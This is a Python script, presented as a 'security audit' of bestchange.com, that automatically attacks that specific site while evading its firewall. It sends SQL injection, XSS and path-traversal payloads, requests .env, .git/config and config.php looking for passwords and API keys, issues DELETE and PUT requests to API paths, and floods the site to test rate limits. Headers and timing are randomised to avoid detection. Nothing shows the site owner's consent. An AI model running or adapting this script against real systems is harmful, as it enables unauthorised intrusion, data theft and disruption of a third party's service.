#!/usr/bin/env python3
"""
BestChange.com Security Audit Script
Comprehensive vulnerability assessment with WAF evasion
"""

import requests
import time
import random
import sys
from urllib.parse import quote, urljoin
import re

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class BestChangeAudit:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        self.setup_session()
    
    def setup_session(self):
        """Configure session with randomized headers for WAF evasion"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
        self.session.verify = True
        self.session.timeout = 10
    
    def random_delay(self, min_sec=0.5, max_sec=2.0):
        """Random delay to avoid rate limiting"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_vulnerability(self, vuln_type, location, payload, evidence):
        """Log discovered vulnerability"""
        vuln = {
            'type': vuln_type,
            'location': location,
            'payload': payload,
            'evidence': evidence
        }
        self.vulnerabilities.append(vuln)
        print(f"{Colors.RED}[!] VULNERABILITY FOUND{Colors.RESET}")
        print(f"  Type: {vuln_type}")
        print(f"  Location: {location}")
        print(f"  Payload: {payload[:100]}...")
        print(f"  Evidence: {evidence[:200]}...")
        print()
    
    def test_sql_injection(self):
        """Test SQL Injection in various parameters"""
        print(f"{Colors.BLUE}[*] Testing SQL Injection vulnerabilities...{Colors.RESET}")
        
        # SQLi payloads with various encoding techniques
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "1' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' OR 1=1#",
            "admin'--",
            "' UNION SELECT 1,2,3,4,5--",
            "1' OR 'x'='x",
            "1' OR 1=1 LIMIT 1--",
        ]
        
        # Test click.php parameters
        test_params = [
            {'id': '1', 'from': '10', 'to': '58', 'city': '0'},
        ]
        
        for params in test_params:
            for param_name in params.keys():
                for payload in sqli_payloads:
                    try:
                        test_params_copy = params.copy()
                        test_params_copy[param_name] = payload
                        
                        url = f"{self.base_url}/click.php"
                        response = self.session.get(url, params=test_params_copy)
                        self.random_delay()
                        
                        # Check for SQL error patterns
                        sql_errors = [
                            'mysql_fetch',
                            'mysqli_fetch',
                            'SQL syntax',
                            'MySQL error',
                            'Warning: mysql',
                            'PostgreSQL query failed',
                            'Warning: pg_',
                            'SQLSTATE',
                            'Microsoft OLE DB',
                            'ODBC SQL Server',
                            'ORA-01756',
                            'quoted string not properly terminated',
                            'unclosed quotation mark',
                        ]
                        
                        response_text = response.text.lower()
                        for error in sql_errors:
                            if error.lower() in response_text:
                                self.log_vulnerability(
                                    "SQL Injection",
                                    f"click.php?{param_name}",
                                    payload,
                                    f"SQL error pattern detected: {error}"
                                )
                                break
                        
                        # Time-based detection
                        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                            start_time = time.time()
                            self.session.get(url, params=test_params_copy, timeout=15)
                            elapsed = time.time() - start_time
                            if elapsed > 4:
                                self.log_vulnerability(
                                    "SQL Injection (Time-based)",
                                    f"click.php?{param_name}",
                                    payload,
                                    f"Response delayed by {elapsed:.2f} seconds"
                                )
                        
                    except requests.exceptions.RequestException as e:
                        continue
                    except Exception as e:
                        continue
        
        # Test index.php parameters
        index_params = ['mt']
        for param in index_params:
            for payload in sqli_payloads[:5]:  # Test subset
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: payload})
                    self.random_delay()
                    
                    response_text = response.text.lower()
                    sql_errors = ['mysql', 'sql syntax', 'postgresql', 'ora-']
                    for error in sql_errors:
                        if error in response_text:
                            self.log_vulnerability(
                                "SQL Injection",
                                f"index.php?{param}",
                                payload,
                                f"SQL error pattern: {error}"
                            )
                            break
                except:
                    continue
    
    def test_xss(self):
        """Test Cross-Site Scripting vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing XSS vulnerabilities...{Colors.RESET}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
        ]
        
        # Test search functionality
        search_endpoints = [
            {'url': f'{self.base_url}/index.php', 'params': {'lc_search': ''}},
        ]
        
        for endpoint in search_endpoints:
            for payload in xss_payloads:
                try:
                    test_params = endpoint['params'].copy()
                    for key in test_params:
                        test_params[key] = payload
                    
                    response = self.session.get(endpoint['url'], params=test_params)
                    self.random_delay()
                    
                    # Check if payload is reflected
                    if payload in response.text or payload.replace("'", "&#39;") in response.text:
                        self.log_vulnerability(
                            "Reflected XSS",
                            endpoint['url'],
                            payload,
                            "Payload reflected in response"
                        )
                    
                    # Check for script execution indicators
                    if '<script>' in payload.lower() and 'alert' in response.text.lower():
                        self.log_vulnerability(
                            "Potential XSS",
                            endpoint['url'],
                            payload,
                            "Script tags found in response"
                        )
                        
                except:
                    continue
    
    def test_idor(self):
        """Test Insecure Direct Object Reference"""
        print(f"{Colors.BLUE}[*] Testing IDOR vulnerabilities...{Colors.RESET}")
        
        # Test click.php with different IDs
        test_ids = [1, 2, 999, 9999, -1, 0, 'admin', '../']
        
        for test_id in test_ids:
            try:
                url = f"{self.base_url}/click.php"
                params = {'id': test_id, 'from': '10', 'to': '58', 'city': '0'}
                response = self.session.get(url, params=params)
                self.random_delay()
                
                # Check for different responses (potential IDOR)
                if response.status_code == 200:
                    # Try to detect if we can access other users' data
                    if len(response.text) > 100:  # Meaningful response
                        # Check for sensitive patterns
                        sensitive_patterns = [
                            r'user_id',
                            r'userid',
                            r'account',
                            r'balance',
                            r'email',
                        ]
                        for pattern in sensitive_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                self.log_vulnerability(
                                    "Potential IDOR",
                                    "click.php?id",
                                    str(test_id),
                                    f"Sensitive pattern found: {pattern}"
                                )
                                break
                                
            except:
                continue
    
    def test_path_traversal(self):
        """Test Path Traversal vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing Path Traversal vulnerabilities...{Colors.RESET}")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ]
        
        # Test in file-related endpoints
        file_endpoints = [
            f"{self.base_url}/images/tableau.json",
            f"{self.base_url}/manifest.json",
        ]
        
        for endpoint in file_endpoints:
            for payload in traversal_payloads:
                try:
                    # Try to inject in path
                    test_url = endpoint.replace('tableau.json', payload)
                    response = self.session.get(test_url)
                    self.random_delay()
                    
                    # Check for file contents
                    if 'root:' in response.text or '[extensions]' in response.text.lower():
                        self.log_vulnerability(
                            "Path Traversal",
                            endpoint,
                            payload,
                            "System file contents detected"
                        )
                        
                except:
                    continue
    
    def test_api_endpoints(self):
        """Test API endpoints for vulnerabilities"""
        print(f"{Colors.BLUE}[*] Testing API endpoints...{Colors.RESET}")
        
        api_endpoints = [
            f"{self.base_url}/images/tableau.json",
            f"{self.base_url}/api/",
            f"{self.base_url}/api/rates",
            f"{self.base_url}/api/v1/",
        ]
        
        for endpoint in api_endpoints:
            try:
                # Test with various HTTP methods
                methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
                for method in methods:
                    try:
                        if method == 'GET':
                            response = self.session.get(endpoint, timeout=5)
                        elif method == 'POST':
                            response = self.session.post(endpoint, json={}, timeout=5)
                        elif method == 'PUT':
                            response = self.session.put(endpoint, json={}, timeout=5)
                        elif method == 'DELETE':
                            response = self.session.delete(endpoint, timeout=5)
                        elif method == 'PATCH':
                            response = self.session.patch(endpoint, json={}, timeout=5)
                        elif method == 'OPTIONS':
                            response = self.session.options(endpoint, timeout=5)
                        
                        self.random_delay(0.3, 1.0)
                        
                        # Check for information disclosure
                        if response.status_code != 404:
                            if 'error' in response.text.lower() and 'stack trace' in response.text.lower():
                                self.log_vulnerability(
                                    "Information Disclosure",
                                    endpoint,
                                    method,
                                    "Stack trace in error response"
                                )
                            
                            # Check for CORS misconfiguration
                            if 'Access-Control-Allow-Origin' in response.headers:
                                if response.headers['Access-Control-Allow-Origin'] == '*':
                                    self.log_vulnerability(
                                        "CORS Misconfiguration",
                                        endpoint,
                                        method,
                                        "Wildcard CORS policy detected"
                                    )
                                    
                    except requests.exceptions.Timeout:
                        continue
                    except:
                        continue
                        
            except:
                continue
    
    def test_information_disclosure(self):
        """Test for information disclosure"""
        print(f"{Colors.BLUE}[*] Testing for information disclosure...{Colors.RESET}")
        
        # Check robots.txt, sitemap, etc.
        info_files = [
            '/robots.txt',
            '/sitemap.xml',
            '/.git/config',
            '/.env',
            '/config.php',
            '/phpinfo.php',
            '/test.php',
            '/admin/',
            '/backup/',
            '/.htaccess',
        ]
        
        for info_file in info_files:
            try:
                url = f"{self.base_url}{info_file}"
                response = self.session.get(url, timeout=5)
                self.random_delay(0.3, 1.0)
                
                if response.status_code == 200:
                    # Check for sensitive information
                    sensitive_patterns = [
                        r'password\s*=\s*[\'"]',
                        r'api[_-]?key\s*=\s*[\'"]',
                        r'secret\s*=\s*[\'"]',
                        r'database',
                        r'DB_',
                        r'PASSWORD',
                    ]
                    
                    for pattern in sensitive_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.log_vulnerability(
                                "Information Disclosure",
                                info_file,
                                "File accessible",
                                f"Sensitive pattern found: {pattern}"
                            )
                            break
                            
            except:
                continue
    
    def test_rate_limiting(self):
        """Test for rate limiting and DoS potential"""
        print(f"{Colors.BLUE}[*] Testing rate limiting...{Colors.RESET}")
        
        try:
            url = f"{self.base_url}/index.php"
            response_times = []
            
            # Send rapid requests
            for i in range(20):
                start = time.time()
                try:
                    response = self.session.get(url, timeout=5)
                    elapsed = time.time() - start
                    response_times.append(elapsed)
                    time.sleep(0.1)  # Very short delay
                except:
                    break
            
            # Check if rate limiting is present
            if len(response_times) == 20:
                avg_time = sum(response_times) / len(response_times)
                if avg_time < 0.5:  # Very fast responses
                    self.log_vulnerability(
                        "Potential DoS",
                        "index.php",
                        "Rapid requests",
                        f"No rate limiting detected (avg response: {avg_time:.2f}s)"
                    )
        except:
            pass
    
    def generate_report(self):
        """Generate final vulnerability report"""
        print(f"\n{Colors.YELLOW}{'='*60}{Colors.RESET}")
        print(f"{Colors.YELLOW}VULNERABILITY AUDIT REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}\n")
        
        if not self.vulnerabilities:
            print(f"{Colors.GREEN}[+] No vulnerabilities detected in automated tests{Colors.RESET}")
            print(f"{Colors.BLUE}[*] Note: Manual testing recommended for comprehensive assessment{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Found {len(self.vulnerabilities)} potential vulnerability(ies){Colors.RESET}\n")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{Colors.YELLOW}[{i}] {vuln['type']}{Colors.RESET}")
                print(f"    Location: {vuln['location']}")
                print(f"    Payload: {vuln['payload']}")
                print(f"    Evidence: {vuln['evidence']}")
                print()
        
        print(f"{Colors.BLUE}[*] Audit completed{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*60}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Security Audit{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*60}{Colors.RESET}\n")
    
    auditor = BestChangeAudit()
    
    try:
        auditor.test_sql_injection()
        auditor.test_xss()
        auditor.test_idor()
        auditor.test_path_traversal()
        auditor.test_api_endpoints()
        auditor.test_information_disclosure()
        auditor.test_rate_limiting()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Audit interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during audit: {str(e)}{Colors.RESET}")
    
    auditor.generate_report()

if __name__ == "__main__":
    main()
